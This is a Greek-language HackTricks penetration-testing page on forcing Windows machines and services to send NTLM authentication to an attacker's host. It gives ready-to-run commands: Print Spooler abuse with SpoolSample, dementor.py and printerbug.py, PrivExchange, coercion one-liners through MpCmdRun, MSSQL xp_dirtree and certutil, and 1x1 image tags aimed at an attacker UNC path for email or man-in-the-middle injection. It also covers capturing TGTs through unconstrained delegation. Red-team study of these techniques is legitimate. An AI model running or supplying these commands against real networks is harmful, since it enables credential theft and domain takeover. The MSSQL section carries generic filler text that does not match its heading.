# Εξαναγκασμός Προνομιούχας Ταυτοποίησης NTLM

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## SharpSystemTriggers

Το [**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) είναι μια **συλλογή** από **τροποποιητές απομακρυσμένης ταυτοποίησης** που έχουν κωδικοποιηθεί σε C# χρησιμοποιώντας τον μεταγλωττιστή MIDL για να αποφευχθούν εξαρτήσεις από τρίτους.

## Κατάχρηση της Υπηρεσίας Spooler

Εάν η υπηρεσία _**Print Spooler**_ είναι **ενεργοποιημένη**, μπορείτε να χρησιμοποιήσετε ορισμένα ήδη γνωστά διαπιστευτήρια AD για να **ζητήσετε** από τον εκτυπωτικό διακομιστή του ελεγκτή του τον **ενημερωμένο** κατάλογο νέων εκτυπώσεων και απλά να του πείτε να **στείλει την ειδοποίηση σε κάποιο σύστημα**.\
Σημειώστε ότι όταν ο εκτυπωτής στέλνει την ειδοποίηση σε ένα αυθαίρετο σύστημα, χρειάζεται να **ταυτοποιηθεί έναντι** αυτού του **συστήματος**. Επομένως, ένας επιτιθέμενος μπορεί να κάνει την υπηρεσία _**Print Spooler**_ να ταυτοποιηθεί έναντι ενός αυθαίρετου συστήματος, και η υπηρεσία θα **χρησιμοποιήσει τον λογαριασμό του υπολογιστή** σε αυτήν την ταυτοποίηση.

### Εύρεση των Windows Servers στον τομέα

Χρησιμοποιώντας το PowerShell, αποκτήστε μια λίστα με τα Windows boxes. Οι διακομιστές είναι συνήθως προτεραιότητα, οπότε ας επικεντρωθούμε εκεί:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Εύρεση υπηρεσιών Spooler που ακούνε

Χρησιμοποιώντας μια ελαφρώς τροποποιημένη έκδοση του SpoolerScanner του @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), ελέγξτε αν η υπηρεσία Spooler ακούει:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Μπορείτε επίσης να χρησιμοποιήσετε το rpcdump.py σε Linux και να αναζητήσετε το πρωτόκολλο MS-RPRN.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Ζητήστε από την υπηρεσία να πιστοποιηθεί έναντι ενός αυθαίρετου υπολογιστή

Μπορείτε να συγκεντρώσετε το [**SpoolSample από εδώ**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ή χρησιμοποιήστε το [**dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) του 3xocyte ή το [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) αν χρησιμοποιείτε Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Συνδυασμός με Απεριόριστη Αναθέση

Εάν ένας επιτιθέμενος έχει ήδη διαρρεύσει έναν υπολογιστή με [Απεριόριστη Αναθέση](unconstrained-delegation.md), ο επιτιθέμενος μπορεί να **κάνει τον εκτυπωτή να πιστοποιηθεί σε αυτόν τον υπολογιστή**. Λόγω της απεριόριστης αναθέσης, το **TGT** του **λογαριασμού υπολογιστή του εκτυπωτή** θα **αποθηκευτεί στη μνήμη** του υπολογιστή με απεριόριστη αναθέση. Καθώς ο επιτιθέμενος έχει ήδη διαρρεύσει αυτόν τον υπολογιστή, θα μπορεί να **ανακτήσει αυτό το εισιτήριο** και να το καταχραστεί ([Pass the Ticket](pass-the-ticket.md)).

## Εξαναγκασμός Πιστοποίησης RCP

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

Η επίθεση `PrivExchange` είναι αποτέλεσμα μιας ευπάθειας που βρέθηκε στο χαρακτηριστικό **PushSubscription** του **Exchange Server**. Αυτό το χαρακτηριστικό επιτρέπει στον διακομιστή Exchange να εξαναγκαστεί από οποιονδήποτε χρήστη του τομέα με ένα κουτί αλληλογραφίας να πιστοποιηθεί σε οποιοδήποτε καθορισμένο από τον πελάτη υπολογιστή μέσω HTTP.

Από προεπιλογή, η υπηρεσία **Exchange τρέχει ως SYSTEM** και έχει υπερβολικά προνόμια (συγκεκριμένα, έχει **δικαιώματα WriteDacl στην προηγούμενη έκδοση Cumulative Update πριν το 2019**). Αυτή η ευπάθεια μπορεί να εκμεταλλευτεί για να επιτρέψει την **ανακατεύθυνση πληροφοριών στο LDAP και στη συνέχεια την εξαγωγή της βάσης δεδομένων NTDS του τομέα**. Σε περιπτώσεις όπου η ανακατεύθυνση στο LDAP δεν είναι δυνατή, αυτή η ευπάθεια μπορεί ακόμα να χρησιμοποιηθεί για την ανακατεύθυνση και πιστοποίηση σε άλλους υπολογιστές εντός του τομέα. Η επιτυχής εκμετάλλευση αυτής της επίθεσης παρέχει άμεση πρόσβαση στον Διαχειριστή του Τομέα με οποιονδήποτε πιστοποιημένο λογαριασμό χρήστη του τομέα.

## Εντός των Windows

Εάν βρίσκεστε ήδη μέσα στο μηχάνημα Windows, μπορείτε να αναγκάσετε τα Windows να συνδεθούν σε ένα διακομιστή χρησιμοποιώντας προνομιούχους λογαριασμούς με:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL

Το MSSQL (Microsoft SQL Server) είναι ένα σύστημα διαχείρισης βάσεων δεδομένων που αναπτύχθηκε από τη Microsoft. Χρησιμοποιείται ευρέως για την αποθήκευση και διαχείριση δεδομένων σε επιχειρηματικές εφαρμογές. Οι επιθέσεις στο MSSQL μπορούν να προκαλέσουν σοβαρές ασφαλειακές προβληματικές καταστάσεις, όπως η πρόσβαση σε ευαίσθητα δεδομένα ή η αποκάλυψη πληροφοριών σύνδεσης. Είναι σημαντικό να λαμβάνονται μέτρα ασφαλείας για την προστασία του MSSQL και των δεδομένων που περιέχει.
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
Ή χρησιμοποιήστε αυτήν την άλλη τεχνική: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Είναι δυνατόν να χρησιμοποιηθεί το certutil.exe lolbin (υπογεγραμμένο από τη Microsoft εκτελέσιμο) για να εξαναγκαστεί η ελέγχου ταυτότητα NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## Εισαγωγή HTML

### Μέσω email

Εάν γνωρίζετε τη **διεύθυνση email** του χρήστη που συνδέεται σε μια μηχανή που θέλετε να παραβιάσετε, μπορείτε απλά να του στείλετε ένα **email με μια εικόνα 1x1** όπως:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
και όταν το ανοίξει, θα προσπαθήσει να πιστοποιηθεί.

### MitM

Εάν μπορείτε να εκτελέσετε μια επίθεση MitM σε έναν υπολογιστή και να εισάγετε HTML σε μια σελίδα που θα οπτικοποιήσει, μπορείτε να δοκιμάσετε να εισάγετε μια εικόνα όπως η παρακάτω στη σελίδα:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Αποκρυπτογράφηση NTLMv1

Εάν μπορείτε να καταγράψετε προκλήσεις NTLMv1, διαβάστε εδώ πώς να τις αποκρυπτογραφήσετε.\
_Να θυμάστε ότι για να αποκρυπτογραφήσετε NTLMv1, πρέπει να ορίσετε την πρόκληση του Responder σε "1122334455667788"_

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
